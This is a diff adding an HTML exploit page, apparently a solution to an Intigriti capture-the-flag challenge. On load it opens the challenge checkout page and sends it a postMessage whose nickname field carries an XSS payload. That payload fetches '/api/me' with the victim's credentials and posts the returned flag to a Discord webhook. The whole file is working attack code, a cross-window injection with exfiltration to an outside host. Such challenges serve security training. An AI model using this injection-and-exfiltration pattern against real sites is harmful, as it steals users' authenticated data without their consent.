@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+<body>
+<script>
+window.onload = () => {
+    const win = window.open('https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=1000000', 'x');
+
+    setTimeout(() => {
+        const payload = `<img src=x onerror="
+            fetch('/api/me', {credentials:'include'})
+            .then(r=>r.json())
+            .then(d=>{
+                fetch('https://discord.com/api/webhooks/1463231849550581891/xi0StB5ZOeisP2iDil0iuOYJzYhT6SYt4L4WWrEzgLqmJjSl0N5xyhrgX0zrjAq7q9o0', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({content:'FLAG: '+d.flag})});
+                alert(d.flag);
+            })
+        ">`;
+
+        win.postMessage({
+            type: 'submitTransaction',
+            transaction: {
+                toAddress: 'deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdead',
+                currency: '1337COIN',
+                amount: 0.0001,
+                nickname: payload
+            }
+        }, '*');
+    }, 2000);
+};
+</script>
+</body>
+</html>
